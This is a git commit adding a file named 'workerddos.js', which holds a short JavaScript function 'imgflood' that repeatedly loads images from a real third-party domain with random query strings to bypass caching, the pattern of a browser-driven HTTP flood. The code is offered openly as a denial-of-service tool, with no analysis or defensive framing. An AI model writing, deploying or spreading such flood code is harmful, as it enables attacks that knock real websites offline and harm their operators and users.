11d90401694ce5b858cc642892426c76665f55c8
h5mcbox <33593244+h5mcbox@users.noreply.github.com>
2019-12-04 21:00:27 +0800

    Create workerddos.js

---
+++ workerddos.js
@@ -0,0 +1,7 @@
+function imgflood() {  
+  var TARGET = 'baidu.com'
+  var URI = '/index.php?'
+  var pic = new Image()
+  var rand = Math.floor(Math.random() * 1000)
+  pic.src = '//'+TARGET+URI+rand+'=val'
+}
